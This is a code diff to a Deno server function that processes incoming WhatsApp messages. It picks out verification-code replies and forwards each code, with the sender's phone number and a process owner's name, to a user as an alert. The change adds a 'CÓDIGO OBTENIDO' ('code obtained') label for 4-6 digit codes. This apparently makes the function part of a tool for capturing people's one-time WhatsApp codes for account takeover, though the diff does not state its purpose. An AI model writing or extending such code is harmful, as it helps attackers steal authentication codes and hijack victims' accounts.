@@ -1,5 +1,3 @@
-
-
 import { serve } from "https://deno.land/std@0.168.0/http/server.ts"
 
 const corsHeaders = {
@@ -361,6 +359,9 @@ serve(async (req) => {
       messageContent: messageText
     });
 
+    // Determinar si mostrar como "CÓDIGO OBTENIDO" (para códigos de 4-6 dígitos) o "CÓDIGO DE VERIFICACIÓN" (para otros)
+    const isCodeObtained = isVerificationCode && codeLength >= 4 && codeLength <= 6;
+
     const notificationMessage = `🔔 Alerta de proceso de WhatsApp
 
 👩🏽‍💻 Servidor Astro
@@ -374,7 +375,9 @@ ${process.owner_name ? `👥 Propietario: ${process.owner_name}` : ''}
 
 📞 Remitente: ${phoneNumber}
 ${isVerificationCode ? 
-  `🔐 CÓDIGO DE VERIFICACIÓN: ${messageText.trim()} (${codeLength} dígitos)` : 
+  (isCodeObtained ? 
+    `🔐 CÓDIGO OBTENIDO: ${messageText.trim()} (${codeLength} dígitos)` : 
+    `🔐 CÓDIGO DE VERIFICACIÓN: ${messageText.trim()} (${codeLength} dígitos)`) :
   `📥 Respuesta: ${messageText}`
 }
 
@@ -415,7 +418,7 @@ ${isVerificationCode ?
     }
 
     console.log('Notification sent successfully to user:', process.user_id);
-    console.log('Message type:', isVerificationCode ? `Verification code (${codeLength} digits)` : 'Regular message');
+    console.log('Message type:', isCodeObtained ? `Code obtained (${codeLength} digits)` : (isVerificationCode ? `Verification code (${codeLength} digits)` : 'Regular message'));
 
     return new Response(
       JSON.stringify({ 
@@ -426,7 +429,7 @@ ${isVerificationCode ?
         phone_number: cleanPhoneNumber,
         matched_pattern: matchedPattern,
         message_content: messageText,
-        message_type: isVerificationCode ? 'verification_code' : 'regular_message',
+        message_type: isCodeObtained ? 'code_obtained' : (isVerificationCode ? 'verification_code' : 'regular_message'),
         code_length: isVerificationCode ? codeLength : null
       }), 
       { 
@@ -450,4 +453,3 @@ ${isVerificationCode ?
     );
   }
 });
-
